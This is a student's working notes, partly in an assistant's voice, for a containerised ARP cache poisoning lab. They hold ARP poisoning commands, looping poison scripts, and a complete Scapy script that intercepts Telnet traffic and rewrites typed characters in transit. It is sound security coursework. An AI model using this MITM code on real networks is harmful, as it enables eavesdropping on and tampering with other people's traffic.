Get IP and Mac:
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{.MacAddress}}{{end}}' *DOCKERCONTAINERVALUE*

### 1.1
root@7a593a72b7d6:~# python3 task1a.py

check:
```
ON A
arp -n
```

### 1.2
ON A:
ping -c 1 10.9.0.6

VERIFY ON A:
arp -n

ON M:
```
python3 task1b.py
```

arp -n to verify on a

FAIL:

CLEAR CACHE ON A:
```
arp -d 10.9.0.6
```

CHECK ON A:
`arp -n`

ON M:
```
python3 task1b.py
```

### 1.3

#### Scenario 1: B's IP is already in A's cache
**Establish Cache Entry (on Host A):** 

```
ping -c 1 10.9.0.6
arp -n # Verify 10.9.0.6 maps to 02:42:0a:09:00:06
```

ON M:
```
python3 task1c.py
```

WORKS

#### Scenario 2: B's IP is not in A's cache
**Clear Cache Entry (on Host A):** Delete the specific ARP entry for Host B:
```
    arp -d 10.9.0.6
    arp -n # Verify 10.9.0.6 entry is gone
```

Run the Attack Script (on Host M) Execute the gratuitous ARP script again:
python3 task1c.py
    ```
    
- **Check Cache Again (on Host A):** Run `arp -n` one more time. See if an entry for `10.9.0.6` has been created and if it maps to M's MAC (`02:42:0a:09:00:69`).

## 2
Alright, let's set up and execute the Man-in-the-Middle (MITM) attack on Telnet for Task 2.

**Goal:** Intercept Telnet traffic between Host A (client `10.9.0.5`) and Host B (server `10.9.0.6`) using Host M (`10.9.0.105`). Modify the traffic so that when 'Q' is typed on A, it appears as 'Z' on A's screen after being processed and echoed by B (via M).

**Phase 1: Setup and ARP Poisoning**

1.  **Ensure Wireshark is Capturing:** Keep your Wireshark capture running on the `br-xxxx` interface. If you stopped it, start it again. You need packets from Task 1, 2, and 3 in the final file.

2.  **ARP Poison Host A:** (Convince A that B's IP is at M's MAC)
    *   On **Host M**, run a script similar to `task1b.py` (ARP Reply) or `task1a.py` (ARP Request) targeting Host A. Let's use the ARP Reply method as an example. You might need to run this periodically if the cache expires quickly, but often running it once or twice is enough for the duration of the test.
    *   *Example command (using a modified task1b.py named `poison_a.py`):*
        ```bash
        # On Host M (7a593a72b7d6)
        # Make sure poison_a.py targets IP_A/MAC_A but claims IP_B is at MAC_M
        sudo python3 poison_a.py # Sends ARP Reply: (Sender IP=IP_B, Sender MAC=MAC_M) -> (Target IP=IP_A, Target MAC=MAC_A)
        ```
    *   Verify on Host A (`docker exec -it fc50e4e36736 bash` then `arp -n`) that `10.9.0.6` now maps to `02:42:0a:09:00:69`.

3.  **ARP Poison Host B:** (Convince B that A's IP is at M's MAC)
    *   On **Host M**, run a similar script, but this time targeting Host B.
    *   Create `poison_b.py` by modifying `task1b.py`: change `IP_A`/`MAC_A` to `IP_B`/`MAC_B` in the target fields (`hwdst`, `pdst`), and change the claimed IP `psrc` to `IP_A`. The source MACs (`hwsrc`, `ether.src`) remain `MAC_M`.
    *   *Example command:*
        ```bash
        # On Host M (7a593a72b7d6)
        # Make sure poison_b.py targets IP_B/MAC_B but claims IP_A is at MAC_M
        sudo python3 poison_b.py # Sends ARP Reply: (Sender IP=IP_A, Sender MAC=MAC_M) -> (Target IP=IP_B, Target MAC=MAC_B)
        ```
    *   Verify on Host B (`docker exec -it 51a2027240d3 bash` then `arp -n`) that `10.9.0.5` now maps to `02:42:0a:09:00:69`.

**Phase 2: Testing Forwarding**

4.  **Disable IP Forwarding on M:**
    ```bash
    # On Host M (7a593a72b7d6)
    sudo sysctl net.ipv4.ip_forward=0
    ```

5.  **Test Connectivity (Should Fail):**
    *   Try pinging B from A:
        ```bash
        # On Host A (fc50e4e36736)
        ping -c 3 10.9.0.6
        ```
    *   This ping should fail (timeout or destination unreachable) because Host M received the packets (due to ARP poisoning) but isn't forwarding them.

6.  **Enable IP Forwarding on M:**
    ```bash
    # On Host M (7a593a72b7d6)
    sudo sysctl net.ipv4.ip_forward=1
    ```

7.  **Test Connectivity (Should Succeed):**
    *   Try pinging B from A again:
        ```bash
        # On Host A (fc50e4e36736)
        ping -c 3 10.9.0.6
        ```
    *   This ping should now succeed because Host M is forwarding the packets between A and B.

**Phase 3: The MITM Attack**

8.  **Prepare the Sniff-and-Spoof Script:**
    *   On **Host M**, create a file named `mitm_telnet.py`.
    *   Paste the following code, which is based on the skeleton but includes the 'Q' to 'Z' replacement and uses `sendp` for more reliable L2 sending:

    ```python
    #!/usr/bin/env python3
    from scapy.all import *
    import sys # To flush output

    # Use values from settings.txt
    IP_A = "10.9.0.5"
    MAC_A = "02:42:0a:09:00:05"
    IP_B = "10.9.0.6"
    MAC_B = "02:42:0a:09:00:06"
    MAC_M = "02:42:0a:09:00:69" # Attacker MAC

    print("MITM Script Started...")
    sys.stdout.flush()

    def spoof_pkt(pkt):
        # Ensure it's an IP packet containing TCP
        if not (IP in pkt and TCP in pkt):
            return

        try:
            if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
                print("-> Processing packet from A to B", end='')
                sys.stdout.flush()
                # Create a new IP packet based on the captured one
                newpkt_ip = IP(bytes(pkt[IP]))
                del(newpkt_ip.chksum) # Delete IP checksum
                if TCP in newpkt_ip:
                    del(newpkt_ip[TCP].chksum) # Delete TCP checksum

                # Construct the new payload
                if pkt[TCP].payload:
                    data = pkt[TCP].payload.load # The original payload data
                    print(f" | Original data: {data.hex()}", end='')
                    # *** THE MODIFICATION ***
                    newdata = data.replace(b'Q', b'Z')
                    print(f" | Modified data: {newdata.hex()}", end='')
                    # Remove old payload before adding new one
                    if TCP in newpkt_ip and Raw in newpkt_ip[TCP]:
                        del(newpkt_ip[TCP].payload)
                    # Construct L3+ packet
                    newpkt_L3 = newpkt_ip/newdata
                else:
                    print(" | No TCP payload.", end='')
                    # Remove old payload if it existed but was empty? Safer to ensure it's gone.
                    if TCP in newpkt_ip and Raw in newpkt_ip[TCP]:
                       del(newpkt_ip[TCP].payload)
                    newpkt_L3 = newpkt_ip # Packet without payload

                # Create L2 frame and send
                newpkt_L2 = Ether(src=MAC_M, dst=MAC_B) / newpkt_L3
                sendp(newpkt_L2, iface='eth0', verbose=False)
                print(" | Sent M -> B")
                sys.stdout.flush()

            elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
                print("<- Processing packet from B to A", end='')
                sys.stdout.flush()
                # Create new packet based on the captured one (no payload change)
                newpkt_ip = IP(bytes(pkt[IP]))
                del(newpkt_ip.chksum)
                if TCP in newpkt_ip:
                    del(newpkt_ip[TCP].chksum)

                # Remove old payload before potentially adding it back (ensures clean state)
                payload_data = None
                if TCP in newpkt_ip and Raw in newpkt_ip[TCP]:
                    payload_data = newpkt_ip[TCP].payload.load # Save payload
                    del(newpkt_ip[TCP].payload) # Delete payload layer

                # Reconstruct L3+ packet
                if payload_data:
                    print(f" | Forwarding data: {payload_data.hex()}", end='')
                    newpkt_L3 = newpkt_ip/payload_data
                else:
                    print(" | No TCP payload.", end='')
                    newpkt_L3 = newpkt_ip

                # Create L2 frame and send
                newpkt_L2 = Ether(src=MAC_M, dst=MAC_A) / newpkt_L3
                sendp(newpkt_L2, iface='eth0', verbose=False)
                print(" | Sent M -> A")
                sys.stdout.flush()

        except Exception as e:
            print(f"\nError processing packet: {e}")
            # pkt.show() # Uncomment for detailed packet info on error


    # Define the filter (more specific)
    f = f"tcp and port 23 and ((src host {IP_A} and dst host {IP_B}) or (src host {IP_B} and dst host {IP_A}))"
    print(f"Starting sniff on eth0 with filter: {f}")
    sys.stdout.flush()

    # Start sniffing
    pkt = sniff(iface="eth0", filter=f, prn=spoof_pkt, store=0)

    print("\nMITM Script Stopped.")
    ```

9.  **Establish Telnet Connection:**
    *   Make sure IP forwarding is still **ON** on Host M (`sudo sysctl net.ipv4.ip_forward=1`).
    *   On **Host A**, connect to Host B via Telnet:
        ```bash
        # On Host A (fc50e4e36736)
        telnet 10.9.0.6
        ```
    *   You should get a login prompt. Log in as `seed` with password `dees`. You should see the welcome message.

10. **Disable IP Forwarding (Crucial Step):**
    *   Now that the connection is established, **disable IP forwarding** on Host M so your script takes over packet handling:
        ```bash
        # On Host M (7a593a72b7d6)
        sudo sysctl net.ipv4.ip_forward=0
        ```

11. **Run the MITM Script:**
    *   On **Host M**, run the sniff-and-spoof script:
        ```bash
        # On Host M (7a593a72b7d6)
        sudo python3 mitm_telnet.py
        ```
    *   You should see the "MITM Script Started..." message and it will wait for packets.

12. **Test the Attack:**
    *   Go back to the **Host A** Telnet window (which is still connected).
    *   **Type a single uppercase 'Q' character.**
    *   **Observe:**
        *   On Host A's Telnet window, you should see a 'Z' appear (not the 'Q' you typed).
        *   On Host M's terminal where `mitm_telnet.py` is running, you should see output indicating it processed a packet from A->B (with original 'Q' data and modified 'Z' data) and then processed the echo packet from B->A (forwarding the 'Z').
        *   In Wireshark, you should see the four required packets:
            1.  A (`10.9.0.5`) -> M (`02:42:0a:09:00:69`) [TCP Payload: 'Q']
            2.  M (`02:42:0a:09:00:69`) -> B (`10.9.0.6`) [TCP Payload: 'Z']
            3.  B (`10.9.0.6`) -> M (`02:42:0a:09:00:69`) [TCP Payload: 'Z' (echo)]
            4.  M (`02:42:0a:09:00:69`) -> A (`10.9.0.5`) [TCP Payload: 'Z' (echo)]

13. **Stop the Attack:**
    *   Press `Ctrl+C` in the Host M terminal running the `mitm_telnet.py` script.
    *   You can close the Telnet session on Host A.

You have now completed Task 2. Ensure the relevant packets are in your Wireshark capture. Keep the capture running for Task 3.

**Poison ARP Caches (on Host M):**

- Run the poisoning scripts to redirect traffic from A and B to M.

bash

- ```
    # On Host M terminal
    sudo python3 poison_a.py
    sudo python3 poison_b.py
    ```
    
    - _(Optional but recommended)_ Quickly verify caches:
        - Open a terminal to Host A (`docker exec -it fc50e4e36736 bash`) and run `arp -n`. Check if `10.9.0.6` maps to `02:42:0a:09:00:69`.
        - Open a terminal to Host B (`docker exec -it 51a2027240d3 bash`) and run `arp -n`. Check if `10.9.0.5` maps to `02:42:0a:09:00:69`.
        - If entries expire later, you might need to re-run the poison scripts.
- **Enable IP Forwarding (on Host M):**
    
    - Allow Host M to initially forward packets so the Telnet connection can be established.
    
    bash
    
- ```
    # On Host M terminal
    sudo sysctl net.ipv4.ip_forward=1
    ```
    
- **Establish Telnet Connection (on Host A):**
    
    - Go to the Host A terminal (or open one: `docker exec -it fc50e4e36736 bash`).
    - Connect to Host B:
    
    bash
    
- ```
    # On Host A terminal
    telnet 10.9.0.6
    ```
    
    - Log in when prompted:
        - Username: `seed`
        - Password: `dees`
    - You should see the welcome message. The connection is now established _through_ Host M (though M is just forwarding packets at this point).
- **Disable IP Forwarding (on Host M) - CRITICAL STEP:**
    
    - Now that the connection is set up, stop Host M from automatically forwarding. This forces packets into your `mitm_telnet.py` script.
    
    bash
    
- ```
    # On Host M terminal
    sudo sysctl net.ipv4.ip_forward=0
    ```
    
- **Run the MITM Script (on Host M):**
    
    - Start the interception script. It will now wait for Telnet packets.
    
    bash
    
- ```
    # On Host M terminal
    sudo python3 mitm_telnet.py
    ```
    
    - You should see the "MITM Script Started..." message.
- **Trigger the Attack (on Host A):**
    
    - Go back to the **Host A terminal** where the Telnet session is active.
    - **Type a single uppercase 'Q'.**

## 3
- **Open two _new_ terminals connected to Host M.** (You'll now have one for `mitm_netcat.py`, one for poisoning A, and one for poisoning B).
- **In the first new Host M terminal, run:**
    
    bash
    
- ```
    # Terminal 1 (Poison A) - on Host M
    while true; do sudo python3 poison_a.py; sleep 2; done
    ```
    
    This will send a poison packet to Host A every 2 seconds.
- **In the second new Host M terminal, run:**
    
    bash
    
- ```
    # Terminal 2 (Poison B) - on Host M
    while true; do sudo python3 poison_b.py; sleep 2; done
    ```
    
    This will send a poison packet to Host B every 2 seconds.
- **Now, follow the steps for the Netcat MITM again:**
    - Ensure `ip_forward=1` (on Host M).
    - Start `nc -lp 9090` (on Host B).
    - Start `nc 10.9.0.6 9090` (on Host A).
    - Set `ip_forward=0` (on Host M).
    - Run `sudo python3 mitm_netcat.py` (in your original Host M terminal).
    - Type your student ID (`iae225`) on Host A and press Enter.
    - Check Host B's output.